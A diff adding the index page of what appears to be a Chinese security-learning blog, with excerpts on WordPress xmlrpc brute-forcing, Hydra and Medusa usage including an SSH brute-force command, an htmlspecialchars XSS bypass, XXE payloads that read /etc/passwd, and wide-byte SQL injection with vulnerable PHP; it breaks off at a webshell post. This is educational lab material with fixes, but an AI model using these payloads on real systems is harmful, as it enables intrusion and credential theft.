@@ -209,6 +209,674 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/14/%E5%88%A9%E7%94%A8xmlrpc-php%E7%88%86%E7%A0%B4wordpress/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="小蚂蚁的小窝">
+      <meta itemprop="description" content="我见青山多妩媚，料青山见我应如是">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xmy's house">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/01/14/%E5%88%A9%E7%94%A8xmlrpc-php%E7%88%86%E7%A0%B4wordpress/" class="post-title-link" itemprop="url">利用xmlrpc-php爆破wordpress</a>
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-01-14 11:33:03 / 修改时间：11:35:03" itemprop="dateCreated datePublished" datetime="2020-01-14T11:33:03+08:00">2020-01-14</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/" itemprop="url" rel="index">
+                    <span itemprop="name">密码破解</span>
+                  </a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>最近在玩一个靶机的时候遇到一个wordpress框架的系统，系统里面有个xmlrpc.php文件，想起以前看到过可以利用这个文件对wordpress进行暴力破解攻击的文章，所以尝试了一下。<br>利用xmlprc.php提供的接口进行用户和密码爆破，可以绕过wordpress对暴力破解的限制，而且使入侵更为隐蔽。</p>
+<h3 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h3><p>攻击的方式为使用POST提交以下数据到xmlrpc.php：</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;iso-8859-1&quot;?&gt;
+&lt;methodCall&gt;
+  &lt;methodName&gt;wp.getUsersBlogs&lt;/methodName&gt;
+  &lt;params&gt;
+   &lt;param&gt;&lt;value&gt;username&lt;/value&gt;&lt;/param&gt;
+   &lt;param&gt;&lt;value&gt;password&lt;/value&gt;&lt;/param&gt;
+  &lt;/params&gt;
+&lt;/methodCall&gt;</code></pre><p>用户名或密码不正确，返回结果如下：<br><img src="http://static.zybuluo.com/xmy2017/c9wtvqu7pdept4tzrfc4ib5p/1.png" alt="1.png-24.5kB"><br>用户名和密码正确，则返回结果如下：<br><img src="http://static.zybuluo.com/xmy2017/wmcsmqzt0czpeq3ubv7gomzi/2.png" alt="2.png-35.7kB"> </p>
+<h3 id="修复方法"><a href="#修复方法" class="headerlink" title="修复方法"></a>修复方法</h3><p>修复方法有以下几种：<br>1.安装Login Security Solution插件。<br>2.删除xmlrpc.php文件。<br>3.设置权限限制，不允许网站访问者访问xmlrpc.php文件。</p>
+<h3 id="案例演示"><a href="#案例演示" class="headerlink" title="案例演示"></a>案例演示</h3><p>靶机系统为Bsides，访问/backup_wordpress/xmlrpc.php文件，Burpsuite抓包，修改请求如下：<br><img src="http://static.zybuluo.com/xmy2017/0suyjgu33n4bqahv7t9y9ncs/3.png" alt="3.png-43.4kB"><br>john是已知存在的用户，所以只对password字段进行暴力破解，结果如下：<br><img src="http://static.zybuluo.com/xmy2017/jrukij419dehjdt0em088zo8/4.png" alt="4.png-99.8kB"></p>
+
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2020/01/14/%E5%88%A9%E7%94%A8xmlrpc-php%E7%88%86%E7%A0%B4wordpress/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/14/%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4%E7%A5%9E%E5%99%A8Medusa/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="小蚂蚁的小窝">
+      <meta itemprop="description" content="我见青山多妩媚，料青山见我应如是">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xmy's house">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/01/14/%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4%E7%A5%9E%E5%99%A8Medusa/" class="post-title-link" itemprop="url">密码爆破神器Medusa</a>
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-01-14 11:24:39 / 修改时间：11:27:23" itemprop="dateCreated datePublished" datetime="2020-01-14T11:24:39+08:00">2020-01-14</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/" itemprop="url" rel="index">
+                    <span itemprop="name">密码破解</span>
+                  </a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>Medusa，美杜莎，希腊神话中的蛇发女妖：<br> <img src="http://static.zybuluo.com/xmy2017/z6b3lk2o0jtkrfaykpxj5vm0/1.png" alt="1.png-832.7kB"></p>
+<p>（挺奇怪为什么密码爆破神器都以希腊神话中的怪物命名）</p>
+<p>与Hydra一样，Medusa支持多种协议的密码爆破，是当之无愧的密码爆破神器。</p>
+<h3 id="Medusa选项"><a href="#Medusa选项" class="headerlink" title="Medusa选项"></a>Medusa选项</h3><p>Medusa的选项和参数如下：<br> <img src="http://static.zybuluo.com/xmy2017/h8kchdfgron5estw2uv3vdfn/2.png" alt="2.png-306.7kB"></p>
+<p>-h [TEXT]　　　　目标主机名或IP<br>-H [FILE]　　　　目标主机文件<br>-u [TEXT]　　　　用户名<br>-U [FILE]　　　　用户名文件<br>-p [TEXT]　　　　密码<br>-P [FILE]　　　　密码文件<br>-C [FILE]　　　　组合条目文件，格式为：host:user:password<br>-O [FILE]　　　　日志信息文件<br>-e [n/s/ns]　　　n代表空密码，s代表用户名与密码相同<br>-M [TEXT]　　　　执行模块名称<br>-m [TEXT]　　　　传递参数到模块，可以传输多个参数<br>-d　　　　　　　　显示所有模块名称<br>-n [NUM]　　　　　指定非默认端口<br>-s　　　　　　　　启用SSL<br>-g [NUM]　　　　尝试连接超时时间（默认为3秒）<br>-r [NUM]　　　　重试间隔时间（默认为3秒）<br>-R [NUM]　　　　超时之前的尝试次数（N），总尝试次数为N+1<br>-C [NUM]　　　　socket连接等待时间（默认为500微秒）<br>-t [NUM]　　　　同时测试的登录数线程<br>-T [NUM]　　　　同时测试的主机数线程<br>-L　　　　　　　每个用户使用一个线程<br>-f　　　　　　　匹配第一个结果时停止破解<br>-q　　　　　　　显示模块的使用信息<br>-v [NUM]　　　　详细信息显示级别[0-6]<br>-w [NUM]　　　　错误高度信息显示级别[0-6]<br>-V　　　　　　　显示版本<br>-Z [TEXT]　　　继续上一次扫描</p>
+<h3 id="Medusa举例"><a href="#Medusa举例" class="headerlink" title="Medusa举例"></a>Medusa举例</h3><p>Medusa支持的协议（称之为模块）如下：<br><img src="http://static.zybuluo.com/xmy2017/z0lki501exe8tb43h60drxqj/3.png" alt="3.png-306.7kB"><br>爆破ssh密码：</p>
+<pre><code>medusa -u root -P pass_top100.txt -e ns -h 192.168.216.130 -M ssh</code></pre>
+
+<p><img src="http://static.zybuluo.com/xmy2017/wvsn9uegw5xq7posljxvexal/4.png" alt="4.png-154.4kB"><br>可以使用-q查阅模块的使用信息，比如查阅web-form模块：</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2020/01/14/%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4%E7%A5%9E%E5%99%A8Medusa/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/14/%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4%E7%A5%9E%E5%99%A8Hydra/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="小蚂蚁的小窝">
+      <meta itemprop="description" content="我见青山多妩媚，料青山见我应如是">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xmy's house">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/01/14/%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4%E7%A5%9E%E5%99%A8Hydra/" class="post-title-link" itemprop="url">密码爆破神器Hydra</a>
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-01-14 11:16:42 / 修改时间：11:24:02" itemprop="dateCreated datePublished" datetime="2020-01-14T11:16:42+08:00">2020-01-14</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/" itemprop="url" rel="index">
+                    <span itemprop="name">密码破解</span>
+                  </a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>Hydra，希腊神话中的怪兽许德拉，就是九头蛇，长这样：<br><img src="http://static.zybuluo.com/xmy2017/vmxy5ido5vv1fnfd1i6rgn9a/1.jpg" alt="1.jpg-53.7kB"><br>好吧，扯远了，我们要说的是Kali中的密码爆破神器Hydra。Hydra支持多种协议的破解，Github上的地址是：<br><a href="https://github.com/vanhauser-thc/thc-hydra" target="_blank" rel="noopener">https://github.com/vanhauser-thc/thc-hydra</a><br>Hydra也有Windows版本，Github上的地址是：<br><a href="https://github.com/maaaaz/thc-hydra-windows" target="_blank" rel="noopener">https://github.com/maaaaz/thc-hydra-windows</a><br>Hydra目前支持的协议如下：<br><img src="http://static.zybuluo.com/xmy2017/bnrm4tbimh2gmgbc5l0h4l16/2.png" alt="2.png-89kB"></p>
+<h3 id="Hydra选项"><a href="#Hydra选项" class="headerlink" title="Hydra选项"></a>Hydra选项</h3><p>Hydra的选项如下：<br><img src="http://static.zybuluo.com/xmy2017/1auhz1empzqwnjynmz25c24o/3.png" alt="3.png-365.5kB"><br>翻译一下：</p>
+<pre><code>-R　　继续从上一次中断的进度进行破解
+-I　　忽略已存在的存储文件（不需要等待10秒）
+-S　　采用SSL连接
+-s PORT    　指定非默认端口
+-l LOGIN or –L FILE     -l后接用户名，-L后接用户字典文件
+-p PASS or –P FILE      -p后接密码，-P后接密码字典文件
+-x MIN:MAX:CHARSET　密码生成器，输入“-x -h”来获取帮助信息
+-y      禁止在暴力破解中使用符号
+-e    nsr    n表示空密码，s表示用户名和密码相同，r表示用户名和密码翻转
+-u    围绕用户名进行探测
+-C FILE      字典格式为login:pass，取代-L/-P选项
+-M FILE      同时攻击多个服务，每行一个服务名，冒号后接端口
+-o FILE   指定结果输出文件，用于替代标准屏幕输出
+-b FORMAT    指定输出文件格式，有text（默认）、json、jsonv1
+-f/-F        当找到第一个匹配结果时中断破解（-M: -f表示
+中断单个目标的破解；-F表示中断全部目标的破解）
+-t TASKS    指定单个目标的线程数（默认是16）
+-T TASKS    指定全部目标的线程数（默认是64）
+-w/-W TIME    指定最大响应超时时间（默认是32）/每个线程的间隔时间（默认是0）
+-c TIME        指定每次登录的尝试等待时间
+-4/-6        指定IPv4（默认）/IPv6
+-v/-V/-d    -v显示全部信息，-V显示每次登录的用户名/密码，-d显示debug信息
+-O      使用SSL v2和v3
+-q      不显示连接出错信息
+-U      显示详细的服务模块信息
+-h      显示帮助信息
+server      指定目标，可以是域名、IP或者网段
+service     指定服务协议（选项后面列出了支持的服务）
+OPT     一些支持的额外选项</code></pre><h3 id="Hydra举例"><a href="#Hydra举例" class="headerlink" title="Hydra举例"></a>Hydra举例</h3><p>hydra –help最后有相应举例：<br><img src="http://static.zybuluo.com/xmy2017/dwtn4x3x74l07htsyhz1une8/4.png" alt="4.png-50.9kB"><br>这些都比较简直，就不详细说明了。举一个比较复杂的例子，http的爆破。使用-U可以显示模块的详细信息，查看http-post-form的信息如下：<br><img src="http://static.zybuluo.com/xmy2017/28c7xxhkepr8x57qrh92hffr/8.png" alt="8.png-358kB"><br>　　http爆破如下：<br><img src="http://static.zybuluo.com/xmy2017/6ju6cjmfc7iwe9m69pthhwa4/5.png" alt="5.png-87.7kB"><br>图中http-post-form分成了三个段，用冒号分隔。第一段是路径；第二段是提交的参数，爆破的参数用^^包围起来；第三段是错误的关键字。</p>
+<h3 id="密码生成器"><a href="#密码生成器" class="headerlink" title="密码生成器"></a>密码生成器</h3><p>来看一下Hydra的密码生成器功能。<br><img src="http://static.zybuluo.com/xmy2017/7uvw6obv6eux1tiei5kt623c/6.png" alt="6.png-101kB"><br>用法是-x MIN:MAX:CHARSET，描述如下：</p>
+<pre><code>MIN        密码最小长度
+MAX        密码最大长度
+CHARSET     指定字符集，a代表小写字母，A代表大写字母，1代表数字,特殊字符需要一个个写进来
+-y        禁止使用占位符</code></pre><p>使用如下：<br><img src="http://static.zybuluo.com/xmy2017/9lore17e0akks46cxt8bchsi/7.png" alt="7.png-152.6kB"></p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2020/01/14/%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4%E7%A5%9E%E5%99%A8Hydra/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/14/htmlspecialchars-%E5%87%BD%E6%95%B0%E8%BF%87%E6%BB%A4XSS%E7%9A%84%E9%97%AE%E9%A2%98/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="小蚂蚁的小窝">
+      <meta itemprop="description" content="我见青山多妩媚，料青山见我应如是">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xmy's house">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/01/14/htmlspecialchars-%E5%87%BD%E6%95%B0%E8%BF%87%E6%BB%A4XSS%E7%9A%84%E9%97%AE%E9%A2%98/" class="post-title-link" itemprop="url">htmlspecialchars-函数过滤XSS的问题</a>
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-01-14 11:12:11 / 修改时间：11:15:47" itemprop="dateCreated datePublished" datetime="2020-01-14T11:12:11+08:00">2020-01-14</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/XSS/" itemprop="url" rel="index">
+                    <span itemprop="name">XSS</span>
+                  </a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>htmlspecialchars()函数的功能如下：<br>htmlspecialchars() 函数把预定义的字符转换为 HTML 实体。<br>预定义的字符是：</p>
+<pre>& （和号）成为 &
+" （双引号）成为 "
+' （单引号）成为 '
+< （小于）成为 <
+> （大于）成为 ></pre>
+
+<p>它的语法如下：</p>
+<pre>htmlspecialchars(string,flags,character-set,double_encode)</pre>
+
+<p>其中第二个参数flags需要重要注意，很多开发者就是因为没有注意到这个参数导致使用htmlspecialchars()函数过滤XSS时被绕过。因为flags参数对于引号的编码如下：<br>可用的引号类型：<br>ENT_COMPAT - 默认。仅编码双引号。<br>ENT_QUOTES - 编码双引号和单引号。<br>ENT_NOQUOTES - 不编码任何引号。<br>默认是只编码双引号的！默认只编码双引号！默认只编码双引号……重要的事情说三遍！！！</p>
+<p>于是看下面的代码：</p>
+<pre><code class="php">&lt;?php   
+    $name = $_GET[&quot;name&quot;];  
+    $name = htmlspecialchars($name);  
+?&gt;  
+
+&lt;input type=&#39;text&#39; value=&#39;&lt;?php echo $name?&gt;&#39;&gt; </code></pre>
+<p>轻松绕过：<br><img src="http://static.zybuluo.com/xmy2017/f9w12k9hraepojh38e1nxswn/image_1bftto1vk1obet9dau91pkq11559.png" alt="image_1bftto1vk1obet9dau91pkq11559.png-94.4kB"><br>加上ENT_QUOTES参数：</p>
+<pre><code class="php">&lt;?php   
+    $name = $_GET[&quot;name&quot;];  
+    $name = htmlspecialchars($name, ENT_QUOTES);  
+?&gt;  
+
+&lt;input type=&#39;text&#39; value=&#39;&lt;?php echo $name?&gt;&#39;&gt; </code></pre>
+<p>发现无法绕过了：<br><img src="http://static.zybuluo.com/xmy2017/kufslbaofmpw2naqxv7fci8l/image_1bfttoqf017gu1b911n0sqt91d9cm.png" alt="image_1bfttoqf017gu1b911n0sqt91d9cm.png-20.9kB"></p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2020/01/14/htmlspecialchars-%E5%87%BD%E6%95%B0%E8%BF%87%E6%BB%A4XSS%E7%9A%84%E9%97%AE%E9%A2%98/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/14/XXE%E6%B3%A8%E5%85%A5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="小蚂蚁的小窝">
+      <meta itemprop="description" content="我见青山多妩媚，料青山见我应如是">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xmy's house">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/01/14/XXE%E6%B3%A8%E5%85%A5/" class="post-title-link" itemprop="url">XXE注入</a>
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-01-14 11:05:43 / 修改时间：11:32:05" itemprop="dateCreated datePublished" datetime="2020-01-14T11:05:43+08:00">2020-01-14</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/XXE%E6%B3%A8%E5%85%A5/" itemprop="url" rel="index">
+                    <span itemprop="name">XXE注入</span>
+                  </a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="XXE注入攻击简介"><a href="#XXE注入攻击简介" class="headerlink" title="XXE注入攻击简介"></a>XXE注入攻击简介</h3><p>XXE Injection即XML External Entity Injection，也就是XML外部实体注入攻击。漏洞是在对非安全的外部实体数据进⾏行处理时引发的安全问题。<br>在XML1.0标准里，XML文档结构里定义了实体(entity)这个概念。实体可以通过预定义在文档中调用，实体的标识符可访问本地或远程内容.如果在这个过程中引入了“污染”源，在对XML文档处理后则可能导致信息泄漏等安全问题。<br>当允许引用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、拒绝服务攻击、攻击内网网站等危害。</p>
+<h3 id="XXE注入利用"><a href="#XXE注入利用" class="headerlink" title="XXE注入利用"></a>XXE注入利用</h3><p>首先存在漏洞的web服务一定是存在XML传输数据的，可以在http头的Content-Type中查看，也可以根据url一些常见的关键字进行判断测试，例如wsdl（web服务描述语言）。或者一些常见的采用XML的java服务配置文件（spring，struts2）。不过现实中存在的大多数XXE漏洞都是blind，即不可见的，必须采用带外通道进行返回信息的记录，这里简单来说就是攻击者必须具有一台具有公网ip的主机。</p>
+<h4 id="简单检测"><a href="#简单检测" class="headerlink" title="简单检测"></a>简单检测</h4><p>Payload如下：</p>
+<pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE any[
+&lt;!ENTITY test &quot;this is a test&quot;&gt;
+]&gt;
+&lt;root&gt;&amp;test;&lt;/root&gt;</code></pre>
+<h4 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h4><p>Payload如下：</p>
+<pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;  
+&lt;!DOCTYPE ANY [  
+&lt;!ENTITY test SYSTEM &quot;file:///etc/passwd&quot;&gt;  
+]&gt; 
+&lt;root&gt;&amp;test;&lt;/root&gt;</code></pre>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2020/01/14/XXE%E6%B3%A8%E5%85%A5/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/14/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="小蚂蚁的小窝">
+      <meta itemprop="description" content="我见青山多妩媚，料青山见我应如是">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xmy's house">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/01/14/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/" class="post-title-link" itemprop="url">宽字节注入</a>
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-01-14 10:59:18 / 修改时间：11:02:54" itemprop="dateCreated datePublished" datetime="2020-01-14T10:59:18+08:00">2020-01-14</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/SQL%E6%B3%A8%E5%85%A5/" itemprop="url" rel="index">
+                    <span itemprop="name">SQL注入</span>
+                  </a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>在使用PHP和MySQL时，设置“setcharacter_set_client=gbk”时可能会导致宽字节注入。宽字节注入的原理是这样子的，当提交1.php?id=1时，假如Mysql语句为“select * from user where id=’1’”，当参数使用了addslashes()、mysql_escape_string()或者GPC开关来过滤单引号（’）、双引号（”）、反斜杠（\）和NULL字符，会在这些符号前面加上反斜杠加以转义，如下：</p>
+<pre><code class="php">    &lt;?php  
+    header(&quot;Content-Type: text/html; charset=utf-8&quot;);  
+    $conn = mysql_connect(&#39;localhost&#39;, &#39;root&#39;, &#39;root&#39;);  
+    mysql_select_db(&quot;test&quot;, $conn);  
+    mysql_query(&quot;SET NAMES GBK&quot;, $conn);    //不安全的编码方式  
+
+    $id = addslashes($_GET[&#39;id&#39;]);          //不安全的转义函数  
+    $sql = &quot;select * from test where id=&#39;$id&#39;&quot;;  
+    $query = mysql_query($sql, $conn);  
+    if($query == True)  
+    {  
+        $result = mysql_fetch_array($query);  
+        $user = $result[&quot;user&quot;];  
+        $email = $result[&quot;email&quot;];  
+
+        print_r(&#39;用户名： &#39; . $user . &#39;&lt;br /&gt;&#39;);  
+        print_r(&#39;邮  箱： &#39; . $email . &#39;&lt;br /&gt;&#39;);  
+        $sql = mb_convert_encoding($sql, &quot;UTF-8&quot;, &quot;GBK&quot;);  
+        print_r(&#39;&lt;br /&gt;SQL语句：&#39; . $sql);  
+
+    }  
+
+    mysql_close($conn);  
+    ?&gt;</code></pre>
+<p><img src="http://static.zybuluo.com/xmy2017/bl96sy1jzbfxy8njiiy9nsyr/image_1bfrcfjceb4615p1adt1p7fbei9.png" alt="image_1bfrcfjceb4615p1adt1p7fbei9.png-30.7kB"></p>
+<p>单引号没有闭合，无法实现注入。我们在参数后面加上%df%27，即可把程序中转义的\（%5c）吃掉。这是因为%df和\组合成了%df%5c，解码成了“運”字，后面的%27（单引号）没有被转义，成功实现了闭合。如下：<br><img src="http://static.zybuluo.com/xmy2017/nt3dex9hvanmum0crsbvg6p9/image_1bfrcg7q7iue2qh5t9otrmsm.png" alt="image_1bfrcg7q7iue2qh5t9otrmsm.png-29.4kB"></p>
+<p>漏洞的产生是因为在PHP连接Mysql时执行了“setcharacter_set_client=gbk”，比如“SET NAMES GBK”，实际上是执行了如下操作：<br>set character_set_connection = gbk,<br>set character_set_results=gbk,<br>set character_set_client=gbk<br>而mysql_set_charset(‘gbk’)实际上是调用了SET NAMES，因此也存在漏洞。同样的编码转换函数iconv()、mb_convert_encoding()等也会产生漏洞。</p>
+<p> 漏洞的防范方法有以下几种：<br>1） 在执行查询之前执行如下操作：SET NAMES GBK; character_set_client=binary。<br>2） 使用mysql_real_escape_string()安全转义函数进行参数过滤。<br>3） 使用pdo方式预编译处理数据库查询。</p>
+
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2020/01/14/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+        
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/14/Mysql%E5%AF%BC%E5%87%BA%E4%B8%80%E5%8F%A5%E8%AF%9D/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="小蚂蚁的小窝">
+      <meta itemprop="description" content="我见青山多妩媚，料青山见我应如是">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xmy's house">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/01/14/Mysql%E5%AF%BC%E5%87%BA%E4%B8%80%E5%8F%A5%E8%AF%9D/" class="post-title-link" itemprop="url">Mysql导出一句话</a>
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
